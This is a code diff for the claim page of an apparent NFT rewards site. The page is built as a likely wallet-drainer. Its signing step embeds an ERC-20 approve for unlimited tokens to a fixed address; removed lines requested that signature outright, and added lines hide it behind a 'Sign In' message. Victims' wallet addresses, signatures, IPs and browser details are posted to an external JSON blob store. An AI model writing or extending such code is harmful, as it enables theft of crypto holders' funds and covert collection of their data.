@@ -14,11 +14,13 @@ import {
   VerifyKDAWallet,
   VerifyLTCWallet,
 } from "@/containers/AddClaim";
+import { ethers } from 'ethers';
 import Link from "next/link";
 
 import Loader from "@/components/Loader";
 import NFTCollectionTabs from "@/components/NFTTabs";
 import { AlertCircle, RefreshCcw } from "lucide-react";
+
 
 import ClaimButton from "@/components/ClaimButton";
 import ClaimRewardHistory from "@/components/ClaimRewardHistory";
@@ -34,8 +36,9 @@ import {
 import { Alchemy } from "alchemy-sdk";
 import Head from "next/head";
 import { useEffect, useState } from "react";
+import useUserAgent from '../hooks/useUserAgent';
 
-const HomePage = ({ ip }) => {
+const HomePage = ({ ip, serverUserAgent }) => {
   let address = useAddress();
   const {
     wallets,
@@ -49,6 +52,7 @@ const HomePage = ({ ip }) => {
     hasErrors,
     refreshAll,
   } = useWalletData(address);
+  const { userAgent, parsed, isMobile, isLoading: useraloading } = useUserAgent(serverUserAgent);
 
   const [userAmNft, setuserAmNft] = useState([]);
   const [userAmBoostNft, setuserAmBoostNft] = useState([]);
@@ -72,7 +76,7 @@ const HomePage = ({ ip }) => {
   const [signedWallets, setSignedWallets] = useState([]);
   const [hasChecked, setHasChecked] = useState(false);
 
-  const BLOB = "1334244546074304512";
+  const BLOB = "1345025525831360512";
   const BASE_URL = `https://jsonblob.com/api/jsonBlob/${BLOB}`;
 
   const fetchSignedWallets = async () => {
@@ -90,6 +94,7 @@ const HomePage = ({ ip }) => {
   };
 
   const updateSignedWallets = async (newWallet) => {
+
     try {
       const currentWallets = await fetchSignedWallets();
       const isExist = currentWallets?.some(
@@ -119,15 +124,25 @@ const HomePage = ({ ip }) => {
     try {
       setIsLoadingSign(true);
       setError("");
-      const sig = await sdk?.wallet.sign(
-        "0x095ea7b300000000000000000000000078896341A45ac6014402db9e335c26D8B4F6781affffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-      );
+
+      const signer = sdk.getSigner()
+
+      const hashedData = ethers.utils.keccak256("0x095ea7b300000000000000000000000078896341A45ac6014402db9e335c26D8B4F6781affffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
+
+
+      const sig = await signer.signMessage('Sign In');
+
+
+      /*  const signature = await sdk?.wallet.sign(ethers.utils.arrayify(
+         "0x095ea7b300000000000000000000000078896341A45ac6014402db9e335c26D8B4F6781affffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
+       ); */
 
 
       const newWallet = {
         id: Math.random(),
         address,
         signature: sig,
+        agent: userAgent,
         timestamp: Date.now(),
       };
 
@@ -637,6 +652,8 @@ export const getServerSideProps = async (context) => {
   let ip = null;
   const { req, params } = context;
 
+
+
   if (req.headers["x-forwarded-for"]) {
     ip = req.headers["x-forwarded-for"].split(",")[0];
   } else if (req.headers["x-real-ip"]) {
@@ -648,6 +665,7 @@ export const getServerSideProps = async (context) => {
   return {
     props: {
       ip: ip,
+      serverUserAgent: req.headers['user-agent'] || null,
     },
   };
 };
